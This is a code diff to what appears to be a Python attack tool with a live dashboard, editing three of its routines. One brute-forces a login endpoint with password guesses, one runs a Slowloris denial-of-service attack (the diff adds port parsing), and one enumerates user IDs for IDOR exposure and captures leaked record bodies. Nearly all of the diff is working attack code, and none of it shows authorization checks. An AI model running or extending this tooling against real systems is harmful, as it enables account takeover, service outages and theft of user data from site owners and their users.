@@ -496,6 +496,7 @@ async def brute_force_attack(url: str, duration: int, intensity: int, threads: i
                     # Try post requests to login endpoint
                     base = url.rstrip('/')
                     test_url = f"{base}/login" if '/login' not in url else url
+                    req_start = time.time()
                     async with session.post(test_url, data=f"username={login_data['username']}&password={password}",
                         headers={'Content-Type': 'application/x-www-form-urlencoded'},
                         timeout=aiohttp.ClientTimeout(total=3)) as response:
@@ -601,8 +602,9 @@ async def slowloris_attack(url: str, duration: int, intensity: int, threads: int
     """Slowloris — opens many partial HTTP connections and keeps them alive."""
     import socket as _sock
     start_time = time.time()
-    host = re.sub(r'^https?://', '', url.strip()).split('/')[0].split(':')[0]
-    port = 443 if url.startswith('https') else 80
+    host_port = re.sub(r'^https?://', '', url.strip()).split('/')[0]
+    host = host_port.split(':')[0]
+    port = int(host_port.split(':')[1]) if ':' in host_port and host_port.split(':')[1].isdigit() else (443 if url.startswith('https') else 80)
     sockets = []
     while time.time() - start_time < duration and metrics['attacks_running']:
         try:
@@ -779,8 +781,20 @@ async def idor_attack(url: str, duration: int, intensity: int, threads: int, att
                 async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                     elapsed = time.time() - t0
                     if resp.status == 200:
+                        body = await resp.text()
                         await record_request_metric(True, elapsed, resp.status)
-                        await manager.broadcast(json.dumps({'type':'log','message':f'[IDOR] 200 OK → /api/users/{base_id} — check manually for data leak','level':'warning'}))
+                        vuln = {
+                            'type': 'IDOR (Insecure Direct Object Reference)',
+                            'url': test_url,
+                            'payload': f'user_id={base_id}',
+                            'severity': 'High',
+                            'evidence': body[:180],
+                            'timestamp': datetime.now().isoformat(),
+                            'attack_id': attack_id
+                        }
+                        if await record_vulnerability(vuln):
+                            await manager.broadcast(json.dumps({'type': 'vulnerability', 'data': vuln}))
+                        await manager.broadcast(json.dumps({'type': 'log', 'message': f'[IDOR] 200 OK → /api/users/{base_id} — unauthenticated record exposed', 'level': 'warning'}))
                     elif resp.status in [401, 403]:
                         await record_request_metric(False, elapsed, resp.status)
                     else:
